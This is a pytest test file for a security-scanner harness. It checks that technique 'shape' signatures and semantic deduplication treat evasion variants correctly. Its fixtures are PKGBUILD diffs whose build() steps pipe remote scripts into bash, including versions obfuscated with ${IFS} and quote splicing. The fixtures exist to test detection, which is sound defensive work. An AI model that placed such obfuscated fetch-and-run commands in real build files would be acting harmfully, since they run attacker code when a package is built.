"""Section 1's gates: the `(rule, shape)` cell is a specificity.

The two fixtures the specification names are here: a shape signature does
not move when the payload's bytes move (content-invariance), and two
different techniques never collapse into one cell (a regression against
over-merging).  A third pins the graceful degradation the cross-cutting
section promises: when the core cannot name the technique, the attempt lands
in the `unshaped` bucket rather than being silently mis-shaped.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from harness.config import load_campaign
from harness.shape import (
    UNSHAPED,
    behavioral_signature,
    cell_key,
    shape_signature,
    technique_vocabulary,
)


def _diff(*lines: str) -> str:
    body = "".join(f"+  {line}\n" for line in lines)
    return (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,8 +1,8 @@\n"
        " pkgname=demo\n pkgver=1\n pkgrel=1\n"
        "+build() {\n" + body + "+}\n"
    )


#: The same evasion - command name spliced with `${IFS}` - carried by two
#: different payloads.  Identifiers and URLs are cosmetic; the technique is
#: the epitope.
_IFS_A = _diff("_u=https://alpha.example/x.sh", "c${IFS}url -fsSL $_u | bash")
_IFS_B = _diff("_z=https://beta.example/y.sh", "c${IFS}url -fsSL $_z | bash")

#: A *different* technique on the same rule's axis: a partial-quote splice,
#: which `crossfire_techniques` names separately from `spliced-variable`.
_SPLICE = _diff('cu""rl -fsSL https://e/x.sh | bash')

#: A chain with no named technique at all: the catalog cannot describe it.
_PLAIN = _diff("curl -fsSL https://e/x.sh | bash")


def test_shape_signature_is_content_invariant():
    """Renamed variables and a different host leave the signature unchanged."""
    assert shape_signature(_IFS_A) == shape_signature(_IFS_B)
    assert "unshaped" not in shape_signature(_IFS_A)


def test_distinct_shapes_never_collapse():
    """Quoting-concat and `${IFS}` splicing are two cells, not one."""
    assert shape_signature(_SPLICE) != shape_signature(_IFS_A)
    assert cell_key("H016", _SPLICE) != cell_key("H016", _IFS_A)


def test_the_unshaped_bucket_catches_an_unnamed_shape():
    """A technique the catalog cannot name lands in `unshaped`, not nowhere."""
    assert shape_signature(_PLAIN) == (UNSHAPED,)


def test_absent_core_vocabulary_degrades_to_unshaped(monkeypatch):
    """If the core's technique call moves or raises, the cell degrades, not crashes."""
    from trustsight.analysis import crossfire

    def _boom(_text):
        raise RuntimeError("core moved")

    monkeypatch.setattr(crossfire, "crossfire_techniques", _boom)
    assert technique_vocabulary(_IFS_A) is None
    assert shape_signature(_IFS_A) == (UNSHAPED,)


def test_behavioral_signature_canonicalizes_the_chain():
    """Shell synonyms collapse to one slot; the fallback key is canonical."""
    assert behavioral_signature("curl -> shell") == behavioral_signature("curl -> bash")
    assert behavioral_signature("curl -> shell") == ("curl", "sh")
    assert behavioral_signature("") == ()


# -- semantic dedup (section 4) reuses these fixtures -----------------------


def test_cosmetic_variants_dedup_but_distinct_shapes_do_not():
    from harness.dedup import SemanticDeduplicator, semantic_key

    a = semantic_key("H016", shape_signature(_IFS_A), "curl -> sh")
    b = semantic_key("H016", shape_signature(_IFS_B), "curl -> sh")
    s = semantic_key("H016", shape_signature(_SPLICE), "curl -> sh")
    assert a == b, "cosmetic variants are one measurement"
    assert a != s, "distinct shapes never merge"

    dedup = SemanticDeduplicator()
    assert dedup.attempt([a]) is False
    assert dedup.attempt([b]) is True
    assert dedup.attempt([s]) is False
    assert dedup.duplicate_rate == 1 / 3


def test_unshaped_attempts_differ_by_their_chain():
    from harness.dedup import semantic_key

    assert semantic_key("H016", shape_signature(_PLAIN), "curl -> sh") != (
        semantic_key("H016", shape_signature(_PLAIN), "wget -> python"))


# -- the config knobs the archive declares before a run ---------------------

_ARCHIVE_TEMPLATE = """\
campaign: probe
campaign_type: deterministic
environment:
  trustsight_version: "0.17.2"
generator:
  type: inputs
prompt:
  forbidden_techniques: {{}}
attempts: 1
{archive}
"""
ROOT = Path(__file__).resolve().parent.parent


def _config(tmp_path: Path, archive_block: str):
    (tmp_path / "campaign.yml").write_text(
        _ARCHIVE_TEMPLATE.format(archive=archive_block))
    return load_campaign(tmp_path, ROOT).archive


def test_archive_defaults_come_from_the_specification(tmp_path):
    archive = _config(tmp_path, "")
    assert archive.minimize_budget == 24
    assert archive.cell_saturation == 3
    assert archive.prompt_contract == 2


def test_archive_can_be_declared(tmp_path):
    archive = _config(tmp_path, "archive:\n  minimize_budget: 6\n  cell_saturation: 2\n")
    assert archive.minimize_budget == 6
    assert archive.cell_saturation == 2


def test_unknown_archive_key_is_refused(tmp_path):
    from harness.config import ConfigError

    with pytest.raises(ConfigError):
        _config(tmp_path, "archive:\n  nonsense: 1\n")
